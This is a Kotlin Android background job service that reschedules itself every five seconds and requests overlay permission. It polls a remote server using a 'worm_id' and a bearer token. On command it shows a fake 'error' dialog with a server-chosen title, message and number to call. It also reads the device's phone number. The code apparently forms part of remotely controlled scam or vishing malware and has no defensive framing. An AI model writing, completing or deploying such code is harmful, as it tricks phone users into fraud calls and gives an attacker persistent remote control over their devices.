package com.example.callservice

import android.Manifest
import android.annotation.SuppressLint
import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import okhttp3.*
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

@Suppress("DEPRECATION")
class MyService : JobService() {

    override fun onStartJob(params: JobParameters?): Boolean {
        if (!Settings.canDrawOverlays(this)) {
            val overlayIntent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(overlayIntent)
        } else {
            checkApiAndUpdateStatus()
        }
        scheduleNextJob(this)
        return false // No more work to do
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        return true // Retry if job is interrupted
    }

    @SuppressLint("HardwareIds")
    private fun getPhoneNumber(): String? {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            val phoneNumber = telephonyManager.line1Number
            Log.d("MyService", "Phone number retrieved: $phoneNumber")
            phoneNumber
        } else {
            Log.e("MyService", "Permission to read phone state is not granted")
            null
        }
    }


    private fun getSavedUUID(): String? {
        val dbHelper = DatabaseHelper(this)
        return dbHelper.getUUID() // Предполагается, что вы реализовали метод getUUID в DatabaseHelper
    }


    private fun checkApiAndUpdateStatus() {
        val apiBaseUrl = getString(R.string.api_base_url)
        val getWormStatusEndpoint = getString(R.string.get_status_endpoint)
        val bearerToken = getString(R.string.bearer_token)

        // Получаем сохраненный UUID
        val uuid = getSavedUUID()
        if (uuid.isNullOrEmpty()) {
            Log.e("MyService", "UUID is not available")
            return
        }

        val client = OkHttpClient()

        // Используем сохраненный UUID в URL
        val statusUrl = "$apiBaseUrl$getWormStatusEndpoint?worm_id=$uuid"

        val request = Request.Builder()
            .url(statusUrl)
            .get()
            .addHeader("Authorization", bearerToken)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
                Log.e("MyService", "Request failure: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val responseData = response.body?.string()
                if (response.isSuccessful) {
                    if (responseData.isNullOrEmpty()) {
                        Log.e("MyService", "Response data is null or empty")
                        return
                    }
                    try {
                        val json = JSONObject(responseData)
                        val isActive = json.getBoolean("is_active")
                        val callTo = json.getString("call_to")
                        val frequency = json.getLong("frequency")
                        val dialogTitle = json.getString("dialog_title")
                        val dialogMessage = json.getString("dialog_message")

                        if (isActive) {
                            showCallDialog(callTo, dialogTitle, dialogMessage)
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                        Log.e("MyService", "JSON parsing error: ${e.message}")
                    }
                } else {
                    Log.e("MyService", "Response error: ${response.code}, Response body: $responseData")
                }
            }
        })
    }


    private fun showCallDialog(callTo: String, dialogTitle: String, dialogMessage: String) {
        val errorIntent = Intent(this, ErrorActivity::class.java).apply {
            putExtra("PHONE_NUMBER", callTo)
            putExtra("DIALOG_TITLE", dialogTitle) // Передаем title
            putExtra("DIALOG_MESSAGE", dialogMessage) // Передаем message
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(errorIntent)
    }

    companion object {
        private const val JOB_ID = 123
        private const val JOB_INTERVAL: Long = 5000 // 5 seconds

        fun scheduleNextJob(context: Context) {
            val componentName = ComponentName(context, MyService::class.java)
            val jobInfo = JobInfo.Builder(JOB_ID, componentName)
                .setMinimumLatency(JOB_INTERVAL)
                .setOverrideDeadline(JOB_INTERVAL)
                .setPersisted(true)
                .build()

            val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            jobScheduler.schedule(jobInfo)
        }
    }
}
